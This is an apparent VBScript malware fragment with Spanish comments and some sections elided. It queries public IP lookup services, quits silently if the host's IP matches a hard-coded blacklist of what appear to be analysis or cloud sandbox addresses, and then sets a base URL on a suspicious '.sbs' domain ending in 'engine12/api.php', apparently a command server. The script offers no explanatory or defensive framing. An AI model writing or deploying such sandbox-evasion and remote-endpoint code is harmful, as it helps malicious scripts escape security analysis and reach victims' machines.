...
Dim strIP, arrBlacklist, ip, found, apiList, apiUrl
found = False

' 1. Lista de IPs bloqueadas
arrBlacklist = Array(_
    "35.227.126.233", "34.11.7.126", "65.55.5.249", "74.179.70.65", _
    "195.74.76.209", "34.30.162.173", "136.107.18.97", "35.199.35.255", _
    "69.55.5.249", "35.186.56.39", "35.186.76.208", "34.123.27.160", _
    "136.112.207.133", "34.58.167.110", "34.28.56.104", "149.102.240.84", "69.94.74.230", "64.124.77.151")

' 2. Lista de APIs de respaldo (Redundancia)
apiList = Array(_
    "https://api.ipify.org", _
    "https://icanhazip.com", _
    "https://ident.me", _
...
' Bucle para intentar con cada API hasta obtener una respuesta válida
For Each apiUrl In apiList
    Err.Clear
    objHTTP.Open "GET", apiUrl, False
    objHTTP.Send
    
    If Err.Number = 0 Then
        strIP = Trim(objHTTP.ResponseText)
        ' Limpiar posibles saltos de línea (común en icanhazip o ident.me)
        strIP = Replace(Replace(strIP, vbCr, ""), vbLf, "")
        
        ' Si obtuvimos algo que parece una IP, salimos del bucle de APIs
        If InStr(strIP, ".") > 0 Then Exit For
    End If
Next

' Si después de recorrer todas las APIs no hay IP, cerramos por precaución
If strIP = "" Then WScript.Quit
On Error GoTo 0

' 3. Verificación contra la Blacklist
For Each ip In arrBlacklist
    If strIP = ip Then
        found = True
        Exit For
    End If
...
' 4. Bloqueo si la IP está en la lista
If found Then WScript.Quit





Dim BASE_URL : BASE_URL = "https://argentinascalientes.sbs/gg/engine12/api.php"
